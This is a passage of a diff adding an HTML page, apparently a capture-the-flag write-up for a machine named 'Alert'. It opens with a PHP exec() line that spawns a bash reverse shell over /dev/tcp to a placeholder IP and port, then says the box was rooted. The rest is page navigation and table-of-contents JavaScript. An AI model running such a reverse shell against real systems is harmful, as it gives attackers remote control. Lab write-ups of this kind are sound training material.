+<span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;/bin/bash -c &#39;bash -i &gt; /dev/tcp/IP/PORT 0&gt;&amp;1&#39;&quot;</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div>
+
+<p><img alt="root" src="../images/Alert/root.png" /></p>
+<p>Rooted!</p>
+            </div>
+            
+            <div class="toc-sidebar">
+                <h3>Contents</h3>
+                <ul id="toc-list">
+                    <!-- This will be populated by JavaScript -->
+                </ul>
+            </div>
+        </div>
+    </main>
+    
+    <!-- Mobile TOC toggle button -->
+    <button class="toc-toggle" aria-label="Toggle table of contents">
+        ≡
+    </button>
+    
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
+        </div>
+    </footer>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/marked/4.3.0/marked.min.js"></script>
+    
+    <script>
+        // Machine metadata for sidebar population
+        let machineData = {};
+        
+        // Function to initialize the application
+        async function initializeApp() {
+            try {
+                // Fetch machine metadata
+                const response = await fetch('../machines.json');
+                if (!response.ok) {
+                    throw new Error('Failed to load machine metadata');
+                }
+                machineData = await response.json();
+                
+                // Populate the sidebar with machine links
+                populateSidebar();
+                
+                // Generate table of contents
+                generateTableOfContents();
+            } catch (error) {
+                console.error('Initialization error:', error);
+                showError("Failed to initialize application. Please refresh and try again.");
+            }
+        }
+
+        // Call the initialization function when the page loads
+        document.addEventListener('DOMContentLoaded', initializeApp);
+
+        // Populate sidebar with machine links dynamically
+        function populateSidebar() {
+            const categories = {
+                "easy": document.getElementById("easy-machines"),
+                "medium": document.getElementById("medium-machines"),
+                "hard": document.getElementById("hard-machines"),
+                "insane": document.getElementById("insane-machines")
+            };
+
+            // Clear existing links
+            for (const category of Object.values(categories)) {
+                category.innerHTML = '';
+            }
+
+            // Add machine links to appropriate categories
+            for (const [machineName, data] of Object.entries(machineData)) {
+                const difficulty = data.difficulty.toLowerCase();
+                if (categories[difficulty]) {
+                    const link = document.createElement('a');
+                    link.href = `../machines/${machineName}.html`;
+                    link.textContent = data.title;
+                    
+                    // Highlight current machine
+                    if (data.title === "Alert") {
+                        link.classList.add('active');
+                    }
+                    
+                    categories[difficulty].appendChild(link);
+                }
+            }
+        }
+
+        // Generate table of contents from headings
+        function generateTableOfContents() {
+            const writeupBody = document.querySelector('.writeup-body');
+            const tocList = document.getElementById('toc-list');
+            const headings = writeupBody.querySelectorAll('h1, h2, h3');
+            
+            // Clear existing TOC
+            tocList.innerHTML = '';
+            
+            headings.forEach((heading, index) => {
+                // Create an ID for the heading if it doesn't have one
+                if (!heading.id) {
+                    // Convert heading text to kebab-case for ID
+                    const headingText = heading.textContent.trim();
+                    const headingId = headingText
+                        .toLowerCase()
+                        .replace(/[^\w\s-]/g, '')
+                        .replace(/\s+/g, '-');
+                    
+                    heading.id = headingId || `section-${index}`;
+                }
+                
+                // Create a list item for the TOC
+                const listItem = document.createElement('li');
+                const link = document.createElement('a');
+                link.href = `#${heading.id}`;
+                link.textContent = heading.textContent;
+                
+                // Add a class for h2 elements to create indentation
+                if (heading.tagName === 'H2') {
+                    listItem.classList.add('sub-heading');
+                    listItem.style.paddingLeft = '15px';
+                } else if (heading.tagName === 'H3') {
+                    listItem.classList.add('sub-sub-heading');
+                    listItem.style.paddingLeft = '30px';
+                }
+                
+                listItem.appendChild(link);
+                tocList.appendChild(listItem);
+            });
+            
+            // Set up scroll highlighting
+            setupScrollHighlighting();
+        }
+
+        // Highlight active TOC section on scroll
+        function setupScrollHighlighting() {
+            const tocLinks = document.querySelectorAll('.toc-sidebar a');
+            
+            function highlightActiveSection() {
+                // Find which section is currently in view
+                const fromTop = window.scrollY + 120;
+                
+                tocLinks.forEach(link => {
+                    const section = document.querySelector(link.hash);
+                    
+                    if (section && 
+                        section.offsetTop <= fromTop &&
+                        section.offsetTop + section.offsetHeight > fromTop) {
+                        link.classList.add('active');
+                    } else {
+                        link.classList.remove('active');
+                    }
+                });
+            }
+            
+            // Call initially and on scroll
+            window.addEventListener('scroll', highlightActiveSection);
+            highlightActiveSection();
+        }
+
+        // Show error message
+        function showError(message) {
+            const contentArea = document.querySelector('.writeup-body');
+            contentArea.innerHTML = `
+                <div class="error-message">
+                    <h2>Error</h2>
+                    <p>${message}</p>
+                </div>
+            `;
+        }
+
+        // Initialize the page
+        document.addEventListener('DOMContentLoaded', function() {
+            // Hamburger menu functionality
+            const hamburgerMenu = document.querySelector('.hamburger-menu');
+            const sidebar = document.querySelector('.sidebar');
+            const backdrop = document.querySelector('.backdrop');
+            
+            hamburgerMenu.addEventListener('click', () => {
+                hamburgerMenu.classList.toggle('active');
+                sidebar.classList.toggle('active');
+                backdrop.classList.toggle('active');
+            });
+            
+            backdrop.addEventListener('click', () => {
+                hamburgerMenu.classList.remove('active');
+                sidebar.classList.remove('active');
+                backdrop.classList.remove('active');
+                tocSidebar.classList.remove('active');
+            });
+            
+            // Difficulty buttons functionality
+            const difficultyButtons = document.querySelectorAll('.difficulty-btn');
+            
+            difficultyButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    const difficulty = button.getAttribute('data-difficulty');
+                    const machineList = document.querySelector(`#${difficulty}-machines`);
+                    
+                    machineList.classList.toggle('active');
+                });
+            });
+            
+            // Mobile TOC toggle
+            const tocToggle = document.querySelector('.toc-toggle');
+            const tocSidebar = document.querySelector('.toc-sidebar');
+            
+            tocToggle.addEventListener('click', () => {
+                tocSidebar.classList.toggle('active');
+                backdrop.classList.toggle('active');
+            });
+            
+            // Close TOC sidebar when clicking on a link (mobile)
+            document.querySelectorAll('.toc-sidebar a').forEach(link => {
+                link.addEventListener('click', () => {
+                    if (window.innerWidth <= 1024) {
+                        tocSidebar.classList.remove('active');
+                        backdrop.classList.remove('active');
+                    }
+                });
+            });
+        });
+
+        // Add smooth scrolling for TOC links
+        document.addEventListener('click', function(e) {
+            if (e.target.tagName === 'A' && e.target.hash) {
+                const element = document.querySelector(e.target.hash);
+                if (element) {
+                    e.preventDefault();
+                    window.scrollTo({
+                        top: element.offsetTop - 90,
+                        behavior: 'smooth'
+                    });
+                }
+            }
+        });
+    </script>
+</body>
+</html>
